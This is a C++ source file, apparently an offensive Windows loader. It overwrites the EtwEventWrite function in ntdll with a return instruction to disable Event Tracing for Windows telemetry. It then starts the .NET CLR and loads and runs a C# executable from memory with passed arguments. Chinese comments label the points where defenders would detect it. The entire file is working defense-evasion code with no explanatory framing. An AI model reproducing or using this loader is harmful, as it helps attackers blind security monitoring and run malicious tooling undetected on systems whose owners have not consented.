#include <stdio.h>
#include <tchar.h>
#include <metahost.h>
#include <windows.h>

#import "mscorlib.tlb" raw_interfaces_only			\
    	high_property_prefixes("_get","_put","_putref")		\
    	rename("ReportEvent", "InteropServices_ReportEvent")	\
	rename("or", "InteropServices_or")

using namespace mscorlib;

#pragma comment(lib, "MSCorEE.lib")

#define STATUS_SUCCESS 0

typedef NTSTATUS(*pfnNtProtectVirtualMemory)(
	IN HANDLE ProcessHandle,
	IN PVOID* BaseAddress,
	IN SIZE_T* NumberOfBytesToProtect,
	IN ULONG NewAccessProtection,
	OUT PULONG OldAccessProtection
	);

typedef NTSTATUS(*pfnNtWriteVirtualMemory)(
	HANDLE hProcess,
	PVOID lpBaseAddress,
	PVOID lpBuffer,
	SIZE_T NumberOfBytesToWrite,
	PSIZE_T NumberOfBytesWritten
	);


BOOL PatchETW()
{

	LPVOID pEtwEventWrite = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"); 
	pfnNtProtectVirtualMemory  NtProtectVirtualMemory = (pfnNtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), 
		"NtProtectVirtualMemory");
	pfnNtWriteVirtualMemory NtWriteVirtualMemory = (pfnNtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"),
		"NtWriteVirtualMemory");
	if (pEtwEventWrite == NULL)
	{
		printf("[!] GetProcAddress:%d\n", GetLastError());
		return FALSE;
	}

	DWORD oldProtect;

#ifdef _M_AMD64
	SIZE_T length = 1;
	char patch[] = { 0xc3 };
#elif defined(_M_IX86)
	SIZE_T length = 3;
	char patch[] = { 0xc2,0x14,0x00 };
#endif

	NTSTATUS ntStatus = STATUS_SUCCESS;
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,TRUE,GetCurrentProcessId());


	if (VirtualProtectEx(hProcess, pEtwEventWrite, length, PAGE_EXECUTE_READWRITE, &oldProtect) == FALSE)
	{
		printf("[!] VirtualProtectEx1:%d\n", ntStatus);
		return FALSE;
	}

	SIZE_T NumberOfBytesWritten = 0;
	if (WriteProcessMemory(hProcess, pEtwEventWrite, patch, length, &NumberOfBytesWritten) == FALSE)
	{
		printf("[!] WriteProcessMemory:%d\n", ntStatus);
		return FALSE;
	}
		
	if(VirtualProtectEx(hProcess, pEtwEventWrite, length, oldProtect, &oldProtect) == FALSE)
	{
		printf("[!] VirtualProtectEx2:%d\n", ntStatus);
		return FALSE;
	}

	return TRUE;

}

int _tmain(int argc, _TCHAR* argv[])
{
	PatchETW();

	//HANDLE hFile = CreateFileA("C:\\Users\\Administrator\\Desktop\\AssemblyLoader\\x64\\Debug\\CSharp.exe",
	HANDLE hFile = CreateFileA("CSharp.exe",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (NULL == hFile)
	{
		return 0;
	}
	DWORD dwFileSize = GetFileSize(hFile, NULL);
	if (dwFileSize == 0)
	{
		return 0;
	}
	PVOID dotnetRaw = malloc(dwFileSize);
	memset(dotnetRaw, 0, dwFileSize);
	DWORD dwReturn = 0;
	if (ReadFile(hFile, dotnetRaw, dwFileSize, &dwReturn, NULL)==FALSE)
	{
		return 0;
	}

	ICLRMetaHost* iMetaHost = NULL;
	ICLRRuntimeInfo* iRuntimeInfo = NULL;
	ICorRuntimeHost* iRuntimeHost = NULL;
	IUnknownPtr pAppDomain = NULL;
	_AppDomainPtr pDefaultAppDomain = NULL;
	_AssemblyPtr pAssembly = NULL;
	_MethodInfoPtr pMethodInfo = NULL;
	SAFEARRAYBOUND saBound[1];
	void* pData = NULL;
	VARIANT vRet;
	VARIANT vObj;
	VARIANT vPsa;
	SAFEARRAY* args = NULL;

	//检测点1
	CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&iMetaHost);
	iMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (VOID**)&iRuntimeInfo);
	iRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&iRuntimeHost);
	iRuntimeHost->Start();


	iRuntimeHost->GetDefaultDomain(&pAppDomain);
	//iRuntimeHost->CreateDomain(L" ", NULL, &pAppDomain);
	pAppDomain->QueryInterface(__uuidof(_AppDomain), (VOID**)&pDefaultAppDomain);

	saBound[0].cElements = dwFileSize;
	saBound[0].lLbound = 0;
	SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, saBound);

	SafeArrayAccessData(pSafeArray, &pData);
	memcpy(pData, dotnetRaw, dwFileSize);
	//free(dotnetRaw);   //释放1
	SafeArrayUnaccessData(pSafeArray);

	//检测点2
	pDefaultAppDomain->Load_3(pSafeArray, &pAssembly);
	//free(pSafeArray->pvData);
	pAssembly->get_EntryPoint(&pMethodInfo);

	ZeroMemory(&vRet, sizeof(VARIANT));
	ZeroMemory(&vObj, sizeof(VARIANT));
	vObj.vt = VT_NULL;


	//复制参数
	vPsa.vt = (VT_ARRAY | VT_BSTR);
	args = SafeArrayCreateVector(VT_VARIANT, 0, 1);

	if (argc > 1)
	{
		vPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, argc);
		for (long i = 0; i < argc; i++)
		{
			SafeArrayPutElement(vPsa.parray, &i, SysAllocString((OLECHAR*)argv[i]));
		}

		long idx[1] = { 0 };
		SafeArrayPutElement(args, idx, &vPsa);
	}

	//检测点3
	HRESULT hr = pMethodInfo->Invoke_3(vObj, args, &vRet);
	pMethodInfo->Release();
	pAssembly->Release();
	pDefaultAppDomain->Release();
	iRuntimeInfo->Release();
	iMetaHost->Release();
	CoUninitialize();
	getchar();
	return 0;
};
